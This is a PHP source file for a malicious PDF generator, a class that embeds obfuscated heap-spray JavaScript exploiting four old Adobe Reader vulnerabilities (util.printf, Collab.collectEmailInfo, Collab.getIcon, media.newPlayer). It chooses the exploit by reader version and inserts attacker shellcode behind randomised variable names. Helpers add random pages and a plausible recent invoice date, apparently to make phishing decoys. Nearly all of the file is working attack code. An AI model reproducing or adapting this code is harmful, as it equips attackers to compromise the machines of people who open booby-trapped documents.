<?php 
require('protection.class.php');
require('obfuscators.class.php');

class PDF_Exploit extends FPDF_Protection {
	
	var $exploits = array();
	
	/*
	 * Hello World App Tester
	 */
	function HelloWorld() {
		$this->IncludeJS("app.alert('Hello World');");
	}
	
	function build_exploit() {
		$payload = '';
		$payload .= "var v = app.viewerVersion.toString();";
		if (array_key_exists('2009-4324', $this->exploits)) { //media.newPlayer < 9.2
			$payload .= "if(v > '9.1') {";
			$payload .= $this->exploits['2009-4324'];
			$payload .= "}";
		}
		
		if (array_key_exists('2009-0927', $this->exploits)) { //Collab.getIcon < 7.1.1, < 8.1.3, and < 9.1
			$payload .= "if(v > '9') {";
			$payload .= $this->exploits['2009-0927'];
			$payload .= "}";
		}
		
		if (array_key_exists('2008-2992', $this->exploits)) { //util.printf < 8.1.3
			$payload .= "if(v < '8.1.3') {";
			$payload .= $this->exploits['2008-2992'];
			$payload .= "}";
		}
			
		if (array_key_exists('2008-0655', $this->exploits)) { //Collab.collectEmailInfo < 8.1.1
			$payload .= "if(v < '8.1.1') {";
			$payload .= $this->exploits['2008-0655'];
			$payload .= "}";			
		}
		
		$this->IncludeJS($payload);
	}
	
	/*
	 * CVE-2008-0655 (CVE-2007-5659) - Collab.collectEmailInfo
	 */
	function addCollectEmailInfo($shellcode) {
		$randoms = Obfuscators::get_random_string_array(15, 30);
		$payload = "";
		$payload .= " var $randoms[1] = unescape('$shellcode');";
		$payload .= " var $randoms[2] ='';";
		$payload .= " for ($randoms[3]=128;$randoms[3]>=0;--$randoms[3]) $randoms[2] += unescape('\x90\x90\x90\x90\x90\x90\x90\x90');";
		$payload .= " $randoms[4] = $randoms[2] + $randoms[1];";
		$payload .= " $randoms[5] = unescape('\x90\x90\x90\x90\x90\x90\x90\x90');";	
		$payload .= " $randoms[6] = 20;";
		$payload .= " $randoms[7] = $randoms[6]+$randoms[4].length;";	
		$payload .= " while ($randoms[5].length<$randoms[7]) $randoms[5]+=$randoms[5];";
		$payload .= " $randoms[8] = $randoms[5].substring(0, $randoms[7]);";
		$payload .= " $randoms[9] = $randoms[5].substring(0, $randoms[5].length-$randoms[7]);";
		$payload .= " while($randoms[9].length+$randoms[7] < 0x40000) $randoms[9] = $randoms[9]+$randoms[9]+$randoms[8];";
		$payload .= " $randoms[10] = new Array();";
		$payload .= " for ($randoms[11]=0;$randoms[11]<1450;$randoms[11]++) $randoms[10][$randoms[11]] = $randoms[9] + $randoms[4];";
		$payload .= " var $randoms[12] = unescape('%u0c0c%u0c0c');";
		$payload .= " while($randoms[12].length < 0x4000) $randoms[12]+=$randoms[12];";	
		$payload .= " this.collabStore = Collab.collectEmailInfo({subj: '',msg: $randoms[12]});";
//		$this->IncludeJS($payload);
		$this->exploits['2008-0655'] = $payload;
	}
	
	/*
	 * CVE-2008-2992 - util.printf
	 */
	function addUtilPrintf($shellcode) {
		$randoms = Obfuscators::get_random_string_array(15, 30);
		$payload = "";
		$payload .= " var $randoms[1] = unescape('$shellcode');";
		$payload .= " var $randoms[2] ='';";
		$payload .= " for ($randoms[3]=128;$randoms[3]>=0;--$randoms[3]) $randoms[2] += unescape('\x90\x90\x90\x90\x90\x90\x90\x90');";
		$payload .= " $randoms[4] = $randoms[2] + $randoms[1];";
		$payload .= " $randoms[5] = unescape('\x90\x90\x90\x90\x90\x90\x90\x90');";
		$payload .= " $randoms[6] = 20;";
		$payload .= " $randoms[7] = $randoms[6]+$randoms[4].length;";	
		$payload .= " while ($randoms[5].length<$randoms[7]) $randoms[5]+=$randoms[5];";
		$payload .= " $randoms[8] = $randoms[5].substring(0, $randoms[7]);";
		$payload .= " $randoms[9] = $randoms[5].substring(0, $randoms[5].length-$randoms[7]);";	
		$payload .= " while($randoms[9].length+$randoms[7] < 0x40000) $randoms[9] = $randoms[9]+$randoms[9]+$randoms[8];";	
		$payload .= " $randoms[10] = new Array();";	
		$payload .= " for ($randoms[11]=0;$randoms[11]<1450;$randoms[11]++) $randoms[10][$randoms[11]] = $randoms[9] + $randoms[4];";	
		$payload .= " util.printf('%45000.45000f', 0);";
//		$this->IncludeJS($payload);
		$this->exploits['2008-2992'] = $payload;
	}
	
	/*
	 * CVE-2009-0927 - Collab.getIcon
	 */
	function addGetIcon($shellcode) {
		$randoms = Obfuscators::get_random_string_array(15, 30);
		$payload = "";
		$payload .= " var $randoms[1] = unescape('$shellcode');";
		$payload .= " var $randoms[2] ='';";
		$payload .= " for ($randoms[3]=128;$randoms[3]>=0;--$randoms[3]) $randoms[2] += unescape('\x90\x90\x90\x90\x90\x90\x90\x90');";
		$payload .= " $randoms[4] = $randoms[2] + $randoms[1];";
		$payload .= " $randoms[5] = unescape('\x90\x90\x90\x90\x90\x90\x90\x90');";
		$payload .= " $randoms[6] = 20;";
		$payload .= " $randoms[7] = $randoms[6]+$randoms[4].length;";
		$payload .= " while ($randoms[5].length<$randoms[7]) $randoms[5]+=$randoms[5];";
		$payload .= " $randoms[8] = $randoms[5].substring(0, $randoms[7]);";
		$payload .= " $randoms[9] = $randoms[5].substring(0, $randoms[5].length-$randoms[7]);";
		$payload .= " while($randoms[9].length+$randoms[7] < 0x40000) $randoms[9] = $randoms[9]+$randoms[9]+$randoms[8];";
		$payload .= " $randoms[10] = new Array();";
		$payload .= " for ($randoms[11]=0;$randoms[11]<1450;$randoms[11]++) $randoms[10][$randoms[11]] = $randoms[9] + $randoms[4];";	
		$payload .= " var $randoms[12] = unescape('%0a');";
		$payload .= " while($randoms[12].length < 0x4000) $randoms[12]+=$randoms[12];";
		$payload .= " $randoms[12] = 'N.'+$randoms[12];";
		$payload .= " Collab.getIcon($randoms[12]);";
//		$this->IncludeJS($payload);
		$this->exploits['2009-0927'] = $payload;
	}
	
	/*
	 * CVE-2009-4324 - media.newPlayer
	 */
	function addNewPlayer($shellcode) {
		$randoms = Obfuscators::get_random_string_array(15, 30);
		$payload = "";
		$payload .= " var $randoms[1] = unescape('$shellcode');";
		$payload .= " var $randoms[2] = unescape('\x90\x90\x90\x90\x90\x90\x90\x90');";
		$payload .= " var $randoms[3] = unescape('0x0c0c0c0c');";
		$payload .= " while($randoms[2].length <= 0x8000) $randoms[2]+=$randoms[2];";
		$payload .= " $randoms[2]=$randoms[2].substring(0,0x8000 - $randoms[1].length);";
		$payload .= " memory=new Array();";
		$payload .= " for(i=0;i<0x2000;i++) { memory[i]= $randoms[2] + $randoms[1]; }";
		$payload .= " util.printd('$randoms[4]', new Date());";
		$payload .= " util.printd('$randoms[5]', new Date());";
		$payload .= " try {this.media.newPlayer(null);} catch(e) {}	";
		$payload .= " util.printd($randoms[3], new Date());";
//		$this->IncludeJS($payload);
		$this->exploits['2009-4324'] = $payload;
	}
	
	function FillWithPages() {
		$number = rand(1, 20);
		for($i=0;$i<$number;$i++) {
		    $this->AddPage();
		}
	}
	
	function RandomDate() {
		$end = new DateTime('last Sunday');
		$start = clone $end;
		$start->sub(new DateInterval('P14D'));
		
		foreach (new DatePeriod($start, new DateInterval('P1D'), $end) as $day) {
		    $dates[] = $day->format('m/d/Y');
		}
		
		$invoice_date = $dates[rand(0,13)];
		return $invoice_date;
	}
}

?>
